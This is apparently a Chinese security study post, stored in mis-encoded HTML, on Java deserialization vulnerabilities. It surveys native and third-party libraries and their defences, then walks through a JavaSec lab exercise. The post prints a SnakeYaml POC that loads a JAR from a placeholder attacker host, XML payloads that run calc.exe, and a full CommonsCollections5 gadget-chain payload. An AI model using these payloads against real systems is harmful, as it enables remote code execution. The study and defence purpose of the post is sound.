<h2 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h2><h3 id="âš™ï¸-ä¸€ã€åŸç”Ÿååºåˆ—åŒ–ç±»"><a href="#âš™ï¸-ä¸€ã€åŸç”Ÿååºåˆ—åŒ–ç±»" class="headerlink" title="âš™ï¸ ä¸€ã€åŸç”Ÿååºåˆ—åŒ–ç±»"></a>âš™ï¸ <strong>ä¸€ã€åŸç”Ÿååºåˆ—åŒ–ç±»</strong></h3><h4 id="1-ObjectInputStream-readObject"><a href="#1-ObjectInputStream-readObject" class="headerlink" title="1. ObjectInputStream.readObject()"></a><strong>1. <code>ObjectInputStream.readObject()</code></strong></h4><ul>
<li><p><strong>æœºåˆ¶</strong>ï¼šJavaæ ‡å‡†åº“é€šè¿‡<code>ObjectInputStream</code>å°†å­—èŠ‚æµè¿˜åŸä¸ºå¯¹è±¡ï¼Œè¦æ±‚ç›®æ ‡ç±»å®ç°<code>Serializable</code>æ¥å£ã€‚</p>
</li>
<li><p><strong>æµç¨‹</strong>ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">try (ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;data.ser&quot;))) &#123;</span><br><span class="line">    Employee emp = (Employee) ois.readObject(); // å¼ºåˆ¶ç±»å‹è½¬æ¢</span><br><span class="line">&#125; catch (ClassNotFoundException | IOException e) &#123;...&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>ç‰¹æ€§</strong>ï¼š</p>
<ul>
<li><strong>ç‰ˆæœ¬å…¼å®¹</strong>ï¼šä¾èµ–<code>serialVersionUID</code>æ ¡éªŒç±»å®šä¹‰ä¸€è‡´æ€§ï¼Œä¸åŒ¹é…åˆ™æŠ›å‡º<code>InvalidClassException</code>ã€‚</li>
<li><strong>å­—æ®µå¤„ç†</strong>ï¼šå¿½ç•¥<code>static</code>å’Œ<code>transient</code>ä¿®é¥°çš„å­—æ®µï¼ˆåè€…å¸¸ç”¨äºæ’é™¤æ•æ„Ÿæ•°æ®å¦‚å¯†ç ï¼‰ã€‚</li>
</ul>
</li>
<li><p><strong>é£é™©</strong>ï¼šæ¶æ„æ„é€ çš„å­—èŠ‚æµå¯è§¦å‘ä»»æ„ä»£ç æ‰§è¡Œï¼ˆå¦‚åˆ©ç”¨<code>readObject</code>ä¸­çš„é‡å†™é€»è¾‘ï¼‰ã€‚</p>
</li>
</ul>
<h4 id="2-SnakeYaml"><a href="#2-SnakeYaml" class="headerlink" title="2. SnakeYaml"></a><strong>2. SnakeYaml</strong></h4><ul>
<li><p><strong>ç”¨é€”</strong>ï¼šè§£æYAMLæ•°æ®ä¸ºJavaå¯¹è±¡ï¼Œæ”¯æŒ<code>Yaml.load()</code>ååºåˆ—åŒ–ã€‚</p>
</li>
<li><p><strong>è¯­æ³•ç‰¹æ€§</strong>ï¼š</p>
<ul>
<li>é€šè¿‡<code>!!</code>å¼ºåˆ¶ç±»å‹è½¬æ¢ï¼ˆå¦‚<code>!!com.example.User</code>ï¼‰ã€‚</li>
<li>æ”¯æŒåµŒå¥—ç»“æ„ï¼ˆå¦‚<code>[[åˆ—è¡¨]]</code>ï¼‰å’Œå¤æ‚æ˜ å°„ã€‚</li>
</ul>
</li>
<li><p><strong>æ¼æ´åŸç†</strong>ï¼š</p>
<ul>
<li><p>åˆ©ç”¨SPIæœºåˆ¶åŠ¨æ€åŠ è½½ç±»ï¼Œä¾‹å¦‚æ¶æ„æ„é€ <code>!!javax.script.ScriptEngineManager</code>åŠ è½½è¿œç¨‹JARï¼Œè§¦å‘é™æ€ä»£ç å—æ‰§è¡Œå‘½ä»¤ã€‚</p>
</li>
<li><p>å¤ç°POCï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">!!javax.script.ScriptEngineManager [</span><br><span class="line">  !!java.net.URLClassLoader [[!!java.net.URL [&quot;http://æ”»å‡»è€…IP/malicious.jar&quot;]]]</span><br><span class="line">]</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>é˜²æŠ¤</strong>ï¼šä½¿ç”¨<code>SafeConstructor</code>ç™½åå•é™åˆ¶å¯åŠ è½½ç±»ã€‚</p>
</li>
</ul>
<h4 id="3-XMLDecoder"><a href="#3-XMLDecoder" class="headerlink" title="3. XMLDecoder"></a><strong>3. XMLDecoder</strong></h4><ul>
<li><strong>æœºåˆ¶</strong>ï¼šJDKå†…ç½®ç»„ä»¶ï¼Œè§£æXMLç”Ÿæˆå¯¹è±¡ï¼Œå¸¸ç”¨äºWebLogicç­‰åœºæ™¯ã€‚</li>
<li><strong>é£é™©</strong>ï¼š<ul>
<li>å¯æ‰§è¡ŒJavaè¡¨è¾¾å¼ï¼ˆå¦‚<code>&lt;java&gt;&lt;void method=&quot;exec&quot;&gt;&lt;string&gt;calc.exe&lt;/string&gt;&lt;/void&gt;&lt;/java&gt;</code>ï¼‰ï¼Œç›´æ¥è§¦å‘å‘½ä»¤æ‰§è¡Œã€‚</li>
</ul>
</li>
<li><strong>ä¸æ ‡å‡†å·®å¼‚</strong>ï¼šåŸºäºXMLæ ‡ç­¾æ„å»ºå¯¹è±¡ï¼Œè€Œéå­—èŠ‚æµï¼Œæ”»å‡»é¢æ›´å¹¿ã€‚</li>
</ul>
<h4 id="åŸç”Ÿæ–¹å¼å¯¹æ¯”"><a href="#åŸç”Ÿæ–¹å¼å¯¹æ¯”" class="headerlink" title="åŸç”Ÿæ–¹å¼å¯¹æ¯”"></a><strong>åŸç”Ÿæ–¹å¼å¯¹æ¯”</strong></h4><table>
<thead>
<tr>
<th><strong>ç±»å‹</strong></th>
<th><strong>æ•°æ®æ ¼å¼</strong></th>
<th><strong>å…³é”®æ–¹æ³•</strong></th>
<th><strong>é«˜å±åœºæ™¯</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>ObjectInputStream</code></td>
<td>äºŒè¿›åˆ¶å­—èŠ‚æµ</td>
<td><code>readObject()</code></td>
<td>æ¶æ„å­—èŠ‚æµè§¦å‘RCE</td>
</tr>
<tr>
<td><strong>SnakeYaml</strong></td>
<td>YAMLæ–‡æœ¬</td>
<td><code>Yaml.load()</code></td>
<td>SPIæœºåˆ¶åŠ è½½è¿œç¨‹æ¶æ„ç±»</td>
</tr>
<tr>
<td><strong>XMLDecoder</strong></td>
<td>XMLæ–‡æœ¬</td>
<td><code>readObject()</code></td>
<td>è§£æXMLæ‰§è¡ŒJavaä»£ç </td>
</tr>
</tbody></table>
<hr>
<h3 id="ğŸ“¦-äºŒã€ç¬¬ä¸‰æ–¹ååºåˆ—åŒ–ç»„ä»¶"><a href="#ğŸ“¦-äºŒã€ç¬¬ä¸‰æ–¹ååºåˆ—åŒ–ç»„ä»¶" class="headerlink" title="ğŸ“¦ äºŒã€ç¬¬ä¸‰æ–¹ååºåˆ—åŒ–ç»„ä»¶"></a>ğŸ“¦ <strong>äºŒã€ç¬¬ä¸‰æ–¹ååºåˆ—åŒ–ç»„ä»¶</strong></h3><h4 id="1-Fastjson"><a href="#1-Fastjson" class="headerlink" title="1. Fastjson"></a><strong>1. Fastjson</strong></h4><ul>
<li><strong>ç”¨é€”</strong>ï¼šé˜¿é‡Œå¼€æºçš„JSONå¤„ç†åº“ï¼Œé€šè¿‡<code>JSON.parseObject()</code>ååºåˆ—åŒ–ã€‚</li>
<li><strong>æ¼æ´æ¨¡å¼</strong>ï¼š<ul>
<li>åˆ©ç”¨<code>@type</code>æŒ‡å®šä»»æ„ç±»ï¼ˆå¦‚<code>com.sun.rowset.JdbcRowSetImpl</code>ï¼‰ï¼Œç»“åˆJNDIæ³¨å…¥å®ç°RCEã€‚</li>
<li>æ”»å‡»é“¾ï¼š<code>setDataSourceName()</code>è§¦å‘LDAPè¯·æ±‚åŠ è½½æ¶æ„ç±»ã€‚</li>
</ul>
</li>
<li><strong>ä¿®å¤</strong>ï¼šå¯ç”¨<code>SafeMode</code>æˆ–å‡çº§åˆ°åŠ å›ºç‰ˆæœ¬ã€‚</li>
</ul>
<h4 id="2-Jackson"><a href="#2-Jackson" class="headerlink" title="2. Jackson"></a><strong>2. Jackson</strong></h4><ul>
<li><strong>æœºåˆ¶</strong>ï¼šSpringç”Ÿæ€é»˜è®¤JSONåº“ï¼Œé€šè¿‡<code>ObjectMapper.readValue()</code>ååºåˆ—åŒ–ã€‚</li>
<li><strong>é£é™©</strong>ï¼š<ul>
<li>éœ€å¼€å¯å¤šæ€ç±»å‹è§£æï¼ˆ<code>enableDefaultTyping()</code>ï¼‰æ—¶ï¼Œæ”»å‡»è€…å¯é€šè¿‡<code>@JsonTypeInfo</code>æ³¨å…¥æ¶æ„å­ç±»ã€‚</li>
</ul>
</li>
<li><strong>é˜²æŠ¤</strong>ï¼šç¦ç”¨å¤šæ€ç»‘å®šï¼Œä½¿ç”¨<code>@JsonTypeId</code>æ˜¾å¼æ§åˆ¶ç±»å‹ã€‚</li>
</ul>
<h4 id="3-XStream"><a href="#3-XStream" class="headerlink" title="3. XStream"></a><strong>3. XStream</strong></h4><ul>
<li><strong>ç”¨é€”</strong>ï¼šXMLä¸å¯¹è±¡è½¬æ¢åº“ï¼Œæ”¯æŒ<code>fromXML()</code>æ–¹æ³•ã€‚</li>
<li><strong>æ¼æ´</strong>ï¼š<ul>
<li>æœªé…ç½®ç±»å‹é™åˆ¶æ—¶ï¼Œå¯æ„é€ XMLè°ƒç”¨<code>ProcessBuilder</code>æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼ˆå¦‚<code>&lt;java.lang.ProcessBuilder&gt;&lt;command&gt;calc.exe&lt;/command&gt;&lt;/java.lang.ProcessBuilder&gt;</code>ï¼‰ã€‚</li>
</ul>
</li>
<li><strong>åŠ å›º</strong>ï¼šé€šè¿‡<code>XStream.setupDefaultSecurity()</code>è®¾ç½®ç±»å‹é»‘åå•ã€‚</li>
</ul>
<h4 id="ç¬¬ä¸‰æ–¹åº“é£é™©å…±æ€§"><a href="#ç¬¬ä¸‰æ–¹åº“é£é™©å…±æ€§" class="headerlink" title="ç¬¬ä¸‰æ–¹åº“é£é™©å…±æ€§"></a><strong>ç¬¬ä¸‰æ–¹åº“é£é™©å…±æ€§</strong></h4><ul>
<li><strong>å…¥å£ç‚¹</strong>ï¼šå‡é€šè¿‡è‡ªå®šä¹‰æ³¨è§£æˆ–å­—æ®µï¼ˆå¦‚Fastjsonçš„<code>@type</code>ã€Jacksonçš„<code>@JsonTypeInfo</code>ï¼‰æŒ‡å®šç±»å‹ã€‚</li>
<li><strong>åˆ©ç”¨é“¾</strong>ï¼šä¾èµ–ç›®æ ‡ç¯å¢ƒä¸­çš„å±é™©ç±»ï¼ˆå¦‚<code>JdbcRowSetImpl</code>ã€<code>TemplatesImpl</code>ï¼‰ã€‚</li>
</ul>
<hr>
<h3 id="ğŸ›¡ï¸-ä¸‰ã€ååºåˆ—åŒ–å®‰å…¨é˜²æŠ¤"><a href="#ğŸ›¡ï¸-ä¸‰ã€ååºåˆ—åŒ–å®‰å…¨é˜²æŠ¤" class="headerlink" title="ğŸ›¡ï¸ ä¸‰ã€ååºåˆ—åŒ–å®‰å…¨é˜²æŠ¤"></a>ğŸ›¡ï¸ <strong>ä¸‰ã€ååºåˆ—åŒ–å®‰å…¨é˜²æŠ¤</strong></h3><ol>
<li><strong>è¾“å…¥æ ¡éªŒ</strong><ul>
<li>ç¦æ­¢ååºåˆ—åŒ–ä¸å¯ä¿¡æ•°æ®æºï¼ˆå¦‚ç”¨æˆ·ä¸Šä¼ æ–‡ä»¶ã€ç½‘ç»œè¯·æ±‚ï¼‰ã€‚</li>
</ul>
</li>
<li><strong>ç±»ç™½åå•</strong><ul>
<li>SnakeYamlä½¿ç”¨<code>SafeConstructor</code>ï¼ŒFastjsonå¯ç”¨<code>SafeMode</code>ï¼ŒXStreamæ³¨å†Œ<code>AllowedClassTypes</code>ã€‚</li>
</ul>
</li>
<li><strong>ä¾èµ–ç®¡ç†</strong><ul>
<li>ç§»é™¤å±é™©ç±»ï¼ˆå¦‚<code>com.sun.rowset.JdbcRowSetImpl</code>ï¼‰ï¼Œå‡çº§åº“ç‰ˆæœ¬ä¿®å¤å·²çŸ¥æ¼æ´ã€‚</li>
</ul>
</li>
<li><strong>è¿è¡Œæ—¶ç›‘æ§</strong><ul>
<li>é€šè¿‡Java Agentæ£€æµ‹æ•æ„Ÿæ–¹æ³•è°ƒç”¨ï¼ˆå¦‚<code>Runtime.exec()</code>ï¼‰ã€‚</li>
</ul>
</li>
</ol>
<h4 id="æ¼æ´å½±å“å¯¹æ¯”"><a href="#æ¼æ´å½±å“å¯¹æ¯”" class="headerlink" title="æ¼æ´å½±å“å¯¹æ¯”"></a><strong>æ¼æ´å½±å“å¯¹æ¯”</strong></h4><table>
<thead>
<tr>
<th><strong>æ¼æ´ç±»å‹</strong></th>
<th><strong>åˆ©ç”¨éš¾åº¦</strong></th>
<th><strong>å½±å“èŒƒå›´</strong></th>
<th><strong>é˜²å¾¡éš¾ç‚¹</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>SPIç±»åŠ è½½é“¾</strong></td>
<td>ä¸­</td>
<td>ä»»æ„ä»£ç æ‰§è¡Œ</td>
<td>éœ€å®Œå…¨é™åˆ¶å¤–éƒ¨ç±»åŠ è½½</td>
</tr>
<tr>
<td><strong>JNDIæ³¨å…¥é“¾</strong></td>
<td>ä½</td>
<td>è¿œç¨‹ç±»åŠ è½½+RCE</td>
<td>ä¾èµ–JDKç‰ˆæœ¬ï¼ˆ&gt;8u191ç¼“è§£ï¼‰</td>
</tr>
<tr>
<td><strong>è¡¨è¾¾å¼æ³¨å…¥</strong></td>
<td>é«˜</td>
<td>æœ¬åœ°ä»£ç æ‰§è¡Œ</td>
<td>XML&#x2F;JSONè§£æé€»è¾‘å¤æ‚æ€§</td>
</tr>
</tbody></table>
<hr>
<h3 id="ğŸ’-æ€»ç»“"><a href="#ğŸ’-æ€»ç»“" class="headerlink" title="ğŸ’ æ€»ç»“"></a>ğŸ’ <strong>æ€»ç»“</strong></h3><p>Javaååºåˆ—åŒ–æ˜¯å¼€å‘ä¸­çš„åŒåˆƒå‰‘ï¼š<strong>åŸç”Ÿæœºåˆ¶</strong>ï¼ˆå¦‚<code>ObjectInputStream</code>ã€XMLDecoderï¼‰éœ€è­¦æƒ•å­—èŠ‚æµç¯¡æ”¹ï¼›<strong>ç¬¬ä¸‰æ–¹åº“</strong>ï¼ˆå¦‚Fastjsonã€SnakeYamlï¼‰çš„çµæ´»è¯­æ³•å¸¦æ¥æ›´å¤§æ”»å‡»é¢ã€‚é˜²æŠ¤æ ¸å¿ƒåœ¨äºï¼š<strong>ä¸¥æ ¼æ ¡éªŒè¾“å…¥</strong>ã€<strong>é™åˆ¶å¯ååºåˆ—åŒ–ç±»å‹</strong>ã€<strong>åŠæ—¶æ›´æ–°ä¾èµ–</strong>ã€‚åœ¨å®é™…å¼€å‘ä¸­ï¼Œè‹¥éå¿…è¦åœºæ™¯ï¼ˆå¦‚RPCä¼ è¾“ï¼‰ï¼Œå»ºè®®ä¼˜å…ˆé€‰ç”¨JSONç­‰å®‰å…¨åºåˆ—åŒ–æ ¼å¼ï¼Œé¿å…ä½¿ç”¨åŸç”ŸäºŒè¿›åˆ¶æˆ–å¤æ‚åµŒå¥—ç»“æ„çš„æ•°æ®æ ¼å¼ã€‚</p>
<h2 id="é¶åœº"><a href="#é¶åœº" class="headerlink" title="é¶åœº"></a>é¶åœº</h2><p><a target="_blank" rel="noopener" href="https://github.com/bewhale/JavaSec">https://github.com/bewhale/JavaSec</a></p>
<p>éƒ¨ç½²ï¼š</p>
<blockquote>
<p>git clone <a target="_blank" rel="noopener" href="https://github.com/bewhale/JavaSec.git">https://github.com/bewhale/JavaSec.git</a></p>
<p><img src="/./images/image-20250817202102756.png" alt="image-20250817202102756"></p>
<p><img src="/./images/image-20250817202233197.png" alt="image-20250817202233197"></p>
<p>ä½¿ç”¨ideaçš„æ•°æ®åº“é“¾æ¥</p>
<p><img src="/./images/image-20250817202354020.png" alt="image-20250817202354020"></p>
<p><img src="/./images/image-20250817202445424.png" alt="image-20250817202445424"></p>
<p>é€‰æ‹©ä¸‹è½½é¡¹ç›®ä¸‹çš„sqlæ–‡ä»¶æ‰§è¡Œä¹‹åï¼Œé…ç½®é¡¹ç›®</p>
<p><img src="/./images/image-20250817202638395.png" alt="image-20250817202638395"></p>
<p>é€‰æ‹©jdk1.8ç‰ˆæœ¬ã€‚ç„¶åå°±å¯ä»¥å¯åŠ¨äº†</p>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1:8000/">http://127.0.0.1:8000/</a> </p>
<p>admin&#x2F;admin</p>
<p><img src="/./images/image-20250817204917444.png" alt="image-20250817204917444"></p>
</blockquote>
<h2 id="åºåˆ—åŒ–æ¼æ´"><a href="#åºåˆ—åŒ–æ¼æ´" class="headerlink" title="åºåˆ—åŒ–æ¼æ´"></a>åºåˆ—åŒ–æ¼æ´</h2><p>æ¥åˆ°åºåˆ—åŒ–ä¸“é¢˜</p>
<h3 id="readObjext"><a href="#readObjext" class="headerlink" title="readObjext"></a>readObjext</h3><p>Java ååºåˆ—åŒ–</p>
<p>åºåˆ—åŒ–æ˜¯å°† Java å¯¹è±¡è½¬æ¢æˆå­—èŠ‚æµçš„è¿‡ç¨‹ã€‚è€Œååºåˆ—åŒ–æ˜¯å°†å­—èŠ‚æµè½¬æ¢æˆ Java å¯¹è±¡çš„è¿‡ç¨‹</p>
<p>javaåºåˆ—åŒ–çš„æ•°æ®ä¸€èˆ¬ä¼šä»¥æ ‡è®°(ac ed 00 05)å¼€å¤´ï¼Œbase64ç¼–ç åçš„ç‰¹å¾ä¸ºrO0AB</p>
<p>JAVA å¸¸è§çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„æ–¹æ³•æœ‰JAVA åŸç”Ÿåºåˆ—åŒ–å’Œ JSON ç±»ï¼ˆfastjsonã€jacksonï¼‰åºåˆ—åŒ–</p>
<p>åºåˆ—åŒ–å’Œååºåˆ—åŒ–é€šè¿‡ObjectInputStream.readObject()å’ŒObjectOutputStream.writeObject()æ–¹æ³•å®ç°ã€‚åœ¨javaä¸­ä»»ä½•ç±»å¦‚æœæƒ³è¦åºåˆ—åŒ–å¿…é¡»å®ç°java.io.Serializableæ¥å£</p>
<p>java.io.Serializableå…¶å®æ˜¯ä¸€ä¸ªç©ºæ¥å£ï¼Œåœ¨javaä¸­è¯¥æ¥å£çš„å”¯ä¸€ä½œç”¨æ˜¯å¯¹ä¸€ä¸ªç±»åšä¸€ä¸ªæ ‡è®°ï¼Œè®©jreç¡®å®šè¿™ä¸ªç±»æ˜¯å¯ä»¥åºåˆ—åŒ–çš„ã€‚</p>
<p>åŒæ—¶javaä¸­æ”¯æŒåœ¨ç±»ä¸­å®šä¹‰writeObjectã€readObjectå‡½æ•°ï¼Œè¿™ä¸¤ä¸ªå‡½æ•°ä¸æ˜¯java.io.Serializableçš„æ¥å£å‡½æ•°ï¼Œè€Œæ˜¯çº¦å®šçš„å‡½æ•°</p>
<p>å¦‚æœä¸€ä¸ªç±»å®ç°äº†è¿™ä¸¤ä¸ªå‡½æ•°ï¼Œé‚£ä¹ˆåœ¨åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„æ—¶å€™ObjectInputStream.readObject()å’ŒObjectOutputStream.writeObject()ä¼šä¸»åŠ¨è°ƒç”¨è¿™ä¸¤ä¸ªå‡½æ•°ã€‚è¿™ä¹Ÿæ˜¯ååºåˆ—åŒ–äº§ç”Ÿçš„æ ¹æœ¬åŸå› </p>
<p><img src="/./images/image-20250817225010002.png" alt="image-20250817225010002"></p>
<p>æŸ¥çœ‹åç«¯ä»£ç </p>
<p><img src="/./images/image-20250817225104004.png" alt="image-20250817225104004"></p>
<blockquote>
<p>è¿™æ®µä»£ç ç›´æ¥ååºåˆ—åŒ–è¾“å…¥çš„base64ç¼–ç çš„æ•°æ®</p>
<ul>
<li><p>1ã€<strong>è¾“å…¥æ§åˆ¶ç‚¹</strong>ï¼š<code>content</code>å‚æ•°ç›´æ¥æ¥æ”¶ç”¨æˆ·è¾“å…¥ï¼Œç»è¿‡Base64è§£ç åç›´æ¥è¿›è¡Œååºåˆ—åŒ–æ“ä½œã€‚æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„åºåˆ—åŒ–å¯¹è±¡ï¼Œåˆ©ç”¨<code>readObject()</code>æ–¹æ³•è§¦å‘ä»»æ„ä»£ç æ‰§è¡Œ</p>
</li>
<li><p>2ã€<strong>Base64è§£ç é—®é¢˜</strong>ï¼šè™½ç„¶ä»£ç å¤„ç†äº†ç©ºæ ¼æ›¿æ¢åŠ å·çš„é—®é¢˜ï¼ˆé˜²æ­¢HTTPä¼ è¾“è¿‡ç¨‹ä¸­åŠ å·è¢«è½¬ä¹‰ä¸ºç©ºæ ¼ï¼‰ï¼Œä½†æ²¡æœ‰å¯¹è¾“å…¥å†…å®¹è¿›è¡Œä»»ä½•éªŒè¯æˆ–è¿‡æ»¤</p>
</li>
<li><p>3ã€<strong>å±é™©çš„ååºåˆ—åŒ–æ“ä½œ</strong>ï¼š<code>java.io.ObjectInputStream</code>ç›´æ¥ååºåˆ—åŒ–ä¸å¯ä¿¡æ•°æ®ï¼Œå¦‚æœç¯å¢ƒä¸­å­˜åœ¨å¯åˆ©ç”¨çš„Gadget Chainï¼ˆå¦‚Apache Commons Collectionsï¼‰ï¼Œå¯èƒ½å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œ</p>
</li>
</ul>
</blockquote>
<p>æ‰€ä»¥å½“æˆ‘ä»¬ç‚¹å‡»æ‰§è¡Œå°±ä¼šå¼¹å‡ºè®¡ç®—å™¨</p>
<p>æ‰§è¡Œæµç¨‹</p>
<p><img src="/./images/image-20250817231341939.png" alt="image-20250817231341939"></p>
<p>ä¸‹é¢æ˜¯å¯¹payloadçš„è¿˜åŸï¼Œå¯èƒ½ä¸å‡†ç¡®ï¼Œé€šè¿‡å·¥å…·é…åˆaiè¿˜åŸçš„</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æ ¸å¿ƒæ¼æ´åˆ©ç”¨é“¾ï¼ˆåŸºäºCommonsCollections5ï¼‰</span></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MaliciousPayload</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 1. æ„é€ Transformerè°ƒç”¨é“¾ï¼ˆæ ¸å¿ƒæ”»å‡»ä»£ç ï¼‰</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class&#125;, </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class&#125;, </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class&#125;, </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;) <span class="comment">// å®é™…æ”»å‡»ä¼šæ›¿æ¢ä¸ºæ¶æ„å‘½ä»¤</span></span><br><span class="line">        &#125;;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 2. åŒ…è£…æˆChainedTransformer</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 3. ä½¿ç”¨LazyMapè§¦å‘æ¼æ´</span></span><br><span class="line">        HashMap&lt;String, String&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map, transformerChain);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 4. é€šè¿‡BadAttributeValueExpExceptionè§¦å‘ååºåˆ—åŒ–</span></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">valField</span> <span class="operator">=</span> payload.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        valField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        valField.set(payload, lazyMap);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 5. åºåˆ—åŒ–payloadå¯¹è±¡ï¼ˆå®é™…æ”»å‡»ä¸­å‘é€ç»™ç›®æ ‡ï¼‰</span></span><br><span class="line">        <span class="comment">// ByteArrayOutputStream bos = new ByteArrayOutputStream();</span></span><br><span class="line">        <span class="comment">// ObjectOutputStream oos = new ObjectOutputStream(bos);</span></span><br><span class="line">        <span class="comment">// oos.writeObject(payload);</span></span><br><span class="line">        <span class="comment">// oos.close();</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ•´ä¸ªè¿‡ç¨‹çš„å…³é”®æ˜¯<strong>ååºåˆ—åŒ–æ—¶çš„ â€œéšå¼æ–¹æ³•è°ƒç”¨â€</strong>ï¼š<br><code>ObjectInputStream.readObject()</code> â†’ é‡å»º<code>BadAttributeValueExpException</code> â†’ è®¿é—®<code>val</code>å­—æ®µï¼ˆ<code>LazyMap</code>ï¼‰ â†’ è§¦å‘<code>LazyMap.get()</code> â†’ æ‰§è¡Œ<code>ChainedTransformer</code>è°ƒç”¨é“¾ â†’ æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚</p>
<h4 id="å·¥å…·åˆ©ç”¨"><a href="#å·¥å…·åˆ©ç”¨" class="headerlink" title="å·¥å…·åˆ©ç”¨"></a>å·¥å…·åˆ©ç”¨</h4><h4 id="Yakit"><a href="#Yakit" class="headerlink" title="Yakit"></a>Yakit</h4><p>-Yakit <a target="_blank" rel="noopener" href="https://yaklang.com/">https://yaklang.com/</a>    </p>
<p><img src="/./images/image-20250818201836064.png" alt="image-20250818201836064"></p>
<p>ç²˜è´´åå°±å¯ä»¥å¼¹å‡ºè®¡ç®—å™¨äº†</p>
<p>åœ¨æµ‹è¯•çš„æ—¶å€™å¯ä»¥å…ˆä½¿ç”¨å…ˆç”¨ â€œæ— å±å®³æ¢æµ‹é“¾â€ éªŒè¯ååºåˆ—åŒ–æ¼æ´å­˜åœ¨</p>
<p><img src="/./images/image-20250818202755093.png" alt="image-20250818202755093"></p>
<p><img src="/./images/image-20250818202954523.png" alt="image-20250818202954523"></p>
<p>ç„¶åæäº¤</p>
<p><img src="/./images/image-20250818203008778.png" alt="image-20250818203008778"></p>
<p>å°±å¯ä»¥çœ‹åˆ°æ•°æ®äº†</p>
<blockquote>
